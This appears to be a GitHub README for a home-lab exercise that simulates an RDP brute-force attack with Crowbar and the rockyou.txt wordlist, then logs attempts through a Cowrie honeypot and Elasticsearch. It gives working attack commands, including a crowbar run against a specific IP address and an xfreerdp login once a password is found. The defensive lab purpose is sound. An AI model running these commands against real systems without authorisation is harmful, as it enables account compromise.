# 🔐 Simulating a Brute-Force Attack Using Crowbar in a Controlled Lab Environment

**Overview:**

This project showcases a controlled brute-force attack simulation on a Windows machine to demonstrate effective detection and response techniques. Crowbar, a powerful brute-forcing tool, targets protocols such as RDP, SSH, and VNC in this simulation. The objective is to understand attacker behaviors and enhance proactive defenses in a lab environment.

# Disclaimer: This is an educational project designed for secure lab environments only. Unauthorized brute-force attacks are illegal and unethical.

<img width="333" alt="Screenshot 2024-11-02 155759" src="https://github.com/user-attachments/assets/af465a8b-5790-43cd-a161-72d9a941f009">

**Tools & Setup**

- Crowbar: Brute-forcing tool for RDP, VNC, and SSH protocols.
- Cowrie: Honeypot for capturing brute-force attempts.
- Elasticsearch & Kibana: To log and analyze brute-force data.

- 🔧 **Steps to Reproduce**
1️⃣ Set Up Crowbar on Kali Linux
Crowbar typically comes pre-installed on Kali Linux. If not, install it using:

```bash
# Install Crowbar if not already installed
sudo apt install crowbar
```
2️⃣ Prepare Your Wordlist 📄
Crowbar requires a wordlist to attempt different passwords. Kali Linux provides several options, including the popular rockyou.txt:
```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
head -20 /usr/share/wordlists/rockyou.txt > /home/homelab/test.txt
```
Example of the first 20 passwords in rockyou.txt:

<img width="252" alt="Screenshot 2024-11-02 161103" src="https://github.com/user-attachments/assets/242642e9-4806-4835-bc89-b7175943def8">

Optional: Customize the wordlist by adding or editing entries:
```bash
nano test.txt
```
3️⃣ Choose Your Target Protocol 🔒
Crowbar supports several protocols (RDP, VNC, SSH). This simulation targets RDP on a Windows environment.
```bash
crowbar -b rdp.
```
<img width="393" alt="Screenshot 2024-11-02 161934" src="https://github.com/user-attachments/assets/4cac223e-23da-4f51-bffb-a35bdfed15fb">


4️⃣ Configure the Honeypot 🛡️
Set up Cowrie as an SSH/Telnet honeypot to capture and log brute-force attempts.
```bash
sudo apt update
sudo apt install cowrie
sudo systemctl start cowrie
```
Ensure the honeypot VM is isolated and configured to log attempts in a secure environment.

5️⃣ Run the Attack 🎯
Execute the brute-force attack with Crowbar, specifying the IP address, protocol, and custom wordlist:
```bash
crowbar -b rdp -U <username path> -C <password path or wordlist> -s <IP Address>
```
```bash
crowbar -b rdp -U target.txt -C test.txt -s 135.234.96.24/32
```
<img width="393" alt="Screenshot 2024-11-02 161934" src="https://github.com/user-attachments/assets/c5b13c2f-7178-41f2-8292-8a78be4ec6a6">


6️⃣ Successful Remote Logon ✅
Once you achieve a successful brute force, log in to the target machine using xfreerdp:
```bash
xfreerdp /u:<username> /p:<password> /v:<IP address>
```
7️⃣ Log & Analyze Attempts 📊
Import the honeypot logs into Elasticsearch or your preferred SIEM tool for in-depth analysis:

Visualization: Analyze brute-force patterns, frequency, and timing to gain insights into attacker behaviors and response techniques.
#
**🚀 Results & Insights**

Through this controlled simulation, we gain insights into:

- Common brute-force patterns
- Effective response strategies, such as account lockout policies and alert tuning
- Enhanced proactive defenses and detection techniques

**🎓 Conclusion**

This project bridges the gap between theory and practical cybersecurity skills by simulating real-world scenarios in a safe environment. It demonstrates valuable techniques in threat detection, incident response, and proactive defense.
